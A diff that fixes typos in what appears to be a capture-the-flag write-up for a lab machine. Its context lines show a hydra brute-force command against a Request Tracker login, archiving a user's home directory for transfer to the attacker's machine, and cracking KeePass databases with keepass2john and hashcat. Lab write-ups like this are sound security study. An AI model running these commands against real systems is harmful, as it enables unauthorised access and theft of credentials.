@@ -15,7 +15,7 @@ PORT   STATE SERVICE
 Nmap done: 1 IP address (1 host up) scanned in 6.24 seconds
 ```
 
-We got a website. Lets take a look.
+We got a website. Let's take a look.
 
 ```bash
 $ firefox http://$TARGET &
@@ -23,7 +23,7 @@ $ firefox http://$TARGET &
 
 ![Initial page](Assets/initial_page_keeper.jpg)
 
-We're directed to `tickets.keeper.htb/rt/`. Lets add `keeper.htb` and `tickets.keeper.htb` to `/etc/hosts` since there's no dns sever to resolve the domain for us.
+We're directed to `tickets.keeper.htb/rt/`. Let's add `keeper.htb` and `tickets.keeper.htb` to `/etc/hosts` since there's no dns sever to resolve the domain for us.
 
 ```bash
 $ sudo bash -c "echo ${TARGET} keeper.htb tickets.keeper.htb >> /etc/hosts"
@@ -33,11 +33,11 @@ Now following the link we get to a Request Tracker login panel.
 
 ![Request Tracker login page](Assets/request_tracker_website.jpg)
 
-Since this seems to be a generic open source thing lets see if there are any known vulnerabilities for our version.
+Since this seems to be a generic open source thing let's see if there are any known vulnerabilities for our version.
 
 ![Request Tracker version info from the login page](Assets/request_tracker_version.jpg)
 
-Quite a few vulnerabilities but no obvious RCE vector. Lets run hydra and sql map in the background + vhost bust and google some more.
+Quite a few vulnerabilities but no obvious RCE vector. Let's run hydra and sql map in the background + vhost bust and google some more.
 
 ```bash
 $ hydra -L /opt/SecLists/Usernames/top-usernames-shortlist.txt -P /opt/SecLists/Passwords/darkweb2017-top10000.txt "tickets.keeper.htb" http-post-form "/rt/NoAuth/Login.html:user=^USER^&pass=^PASS^:Your username or password is incorrect"
@@ -79,7 +79,7 @@ Hydra (https://github.com/vanhauser-thc/thc-hydra)
  ... snip ...
 ```
 
-And we got ssh access. Lets login and run linpeas in the background we manually looking around.
+And we got ssh access. Let's login and run linpeas in the background as we start manually looking around.
 
 ```bash
 $ py -m uploadserver
@@ -125,7 +125,7 @@ drwx------ 2 lnorgaard lnorgaard 4.0K Oct 12 18:03 .ssh
 -rw-r--r-- 1 root      root        39 Jul 20 19:03 .vimrc
 ```
 
-Lets package them and send them over to our box for a closer inspection.
+Let's package them and send them over to our box for a closer inspection.
 
 ```bash
 lnorgaard@keeper:~$ tar -czvf /tmp/archive.tar.gz .
@@ -196,7 +196,7 @@ Please provide the master password: *************************
 Couldn't load the file passcodes_1.kdbx: Missing pass
 ```
 
-Seems like both databases require a master password. Lets run hashcat and ask google if there�s anything interesting that can be done with the dump files.
+Seems like both databases require a master password. Let's run hashcat and ask google if there�s anything interesting that can be done with the dump files.
 
 ```bash
 $ keepass2john passcodes.kdbx | grep -o "$keepass$.*" >  hashes
@@ -252,7 +252,7 @@ Please provide the master password: *************************
 kpcli:/>
 ```
 
-`Rødgrød med fløde` doesn't work but `rødgrød med fløde` does! Lets dump the db with https://keepassxc.org.
+`Rødgrød med fløde` doesn't work but `rødgrød med fløde` does! Let's dump the db with https://keepassxc.org.
 
 Root putty key here!
 
